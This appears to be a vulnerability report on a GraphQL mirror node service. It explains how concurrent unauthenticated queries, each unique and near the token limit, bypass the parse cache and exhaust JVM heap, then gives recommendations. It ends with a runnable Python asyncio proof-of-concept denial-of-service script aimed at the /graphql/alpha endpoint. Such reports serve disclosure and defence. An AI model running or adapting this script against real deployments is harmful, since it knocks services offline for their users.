### Title
GraphQL Parser Memory Exhaustion via Concurrent Max-Token Unique Queries (No Rate Limiting)

### Summary
The `GraphQlConfiguration` static initializer sets `maxTokens(1000)` and `maxWhitespaceTokens(1000)`, permitting up to 2000 ANTLR tokens per request. The GraphQL module has no application-level rate limiting (unlike the `web3` module), and the Traefik in-flight request middleware is disabled by default (`global.middleware: false`). An unauthenticated attacker sending many concurrent requests with unique query strings — each crafted to hit both token limits — bypasses the preparsed document cache and forces repeated full ANTLR parses, accumulating heap allocations faster than GC can reclaim them.

### Finding Description

**Exact code location:**

`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, static initializer, lines 31–39:

```java
static {
    Consumer<Builder> consumer =
            b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
    ParserOptions.setDefaultParserOptions(
            ParserOptions.getDefaultParserOptions().transform(consumer));
    ParserOptions.setDefaultOperationParserOptions(
            ParserOptions.getDefaultOperationParserOptions().transform(consumer));
}
```

**Root cause:** `maxTokens` and `maxWhitespaceTokens` are rejection thresholds, not memory caps. A query with exactly 999 regular tokens and 999 whitespace tokens is accepted and causes graphql-java's ANTLR4 runtime to allocate a `CommonTokenStream` holding ~2000 `Token` objects, a full parse tree, and subsequent validation state — estimated 2–10 MB of short-lived heap per concurrent parse.

**Cache bypass:** `CachedPreparsedDocumentProvider.getDocumentAsync` keys on the exact query string:

```java
return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
```

An attacker who varies a single field alias or argument value per request produces a unique cache key every time, forcing `parseAndValidateFunction` (full ANTLR parse + validation) to execute on every request.

**No rate limiting in the GraphQL module:** The `web3` module has `ThrottleManagerImpl` backed by bucket4j. The `graphql` module has no equivalent — only a `LoggingFilter` with no throttling logic. The Traefik middleware that would limit in-flight requests to 5 per IP is gated behind `global.middleware: false` (the default in `charts/hedera-mirror-graphql/values.yaml` line 89).

**Exploit flow:**
1. Attacker generates N unique query strings, each consuming ~999 regular tokens and ~999 whitespace tokens (e.g., deeply aliased fields with padded whitespace, staying under `maxCharacters(10000)`).
2. Attacker sends all N requests concurrently to `/graphql/alpha` with no authentication required.
3. Each request misses the Caffeine cache (unique key) and triggers a full ANTLR parse.
4. With N concurrent parses each allocating ~5 MB, N ≈ 400 exhausts the 2 GB JVM heap (`resources.limits.memory: 2048Mi`).
5. JVM throws `OutOfMemoryError`; the pod crashes or becomes unresponsive; liveness probe (`/actuator/health/liveness`) fails; Kubernetes restarts the pod.
6. Repeated across multiple nodes simultaneously causes ≥30% of GraphQL processing capacity to go offline.

### Impact Explanation
Heap exhaustion causes JVM `OutOfMemoryError`, crashing the Spring Boot process. The Kubernetes liveness probe detects the failure and restarts the pod, but during the restart window the node is unavailable. Sustained attack across multiple replicas degrades or eliminates GraphQL API availability. The GraphQL API is the only interface for certain mirror node queries; its unavailability affects downstream consumers of Hedera network data.

### Likelihood Explanation
No authentication or API key is required to reach `/graphql/alpha`. Generating unique max-token queries is trivial — a script varying a single alias character per request suffices. The attack requires only moderate concurrency (~400 simultaneous connections) achievable from a single machine with async HTTP tooling (e.g., `wrk`, `hey`, or a simple Python `asyncio` script). The middleware protection is off by default, meaning most deployments that follow the default Helm values are unprotected. The attack is repeatable: after pod restart, the attacker can immediately resume.

### Recommendation
1. **Add application-level rate limiting to the GraphQL module** mirroring the `web3` module's `ThrottleManagerImpl` / bucket4j pattern — limit requests per second per IP before the parsing stage.
2. **Lower token limits** to values consistent with legitimate query patterns (e.g., `maxTokens(200)`, `maxWhitespaceTokens(200)`), reducing per-request parse cost by ~5×.
3. **Enable the Traefik middleware by default** (`global.middleware: true`) so the `inFlightReq: amount: 5` per-IP limit is active in standard deployments.
4. **Add a Tomcat/Netty connection queue limit** to bound the number of requests that can be simultaneously in the parsing stage.

### Proof of Concept

```python
import asyncio, aiohttp, string, random

URL = "http://<graphql-node>:8083/graphql/alpha"

def make_max_token_query(seed: int) -> str:
    # Alias varies per request → unique cache key every time
    alias = f"a{seed}"
    # ~999 tokens: deeply nested field selections with whitespace padding
    fields = " ".join([f"{alias}{i}: balance" for i in range(90)])
    return (
        "{ " + " ".join([
            f"account{i}:account(input:{{entityId:{{shard:0,realm:0,num:{i}}}}})"
            f"{{ {fields} }}"
            for i in range(10)
        ]) + " }"
    )

async def send(session, i):
    q = make_max_token_query(i)
    payload = {"query": q}
    async with session.post(URL, json=payload) as r:
        return r.status

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send(session, i) for i in range(500)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    print(results)

asyncio.run(main())
```
